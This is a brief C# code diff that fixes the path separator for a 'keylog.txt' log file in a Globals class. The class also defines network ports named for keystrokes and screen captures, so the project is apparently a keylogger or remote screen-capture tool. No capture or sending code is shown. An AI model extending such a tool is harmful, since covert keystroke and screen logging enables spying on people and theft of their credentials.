@@ -11,7 +11,7 @@ using System.Text;
 
 public static class Globals
 {
-    public static string logfp = Path.GetDirectoryName(Assembly.GetEntryAssembly().Location) + "/keylog.txt";
+    public static string logfp = Path.GetDirectoryName(Assembly.GetEntryAssembly().Location) + @"\keylog.txt";
     public const Int32 keyPort = 40404;
     public const Int32 screenPort = 40405;
 }
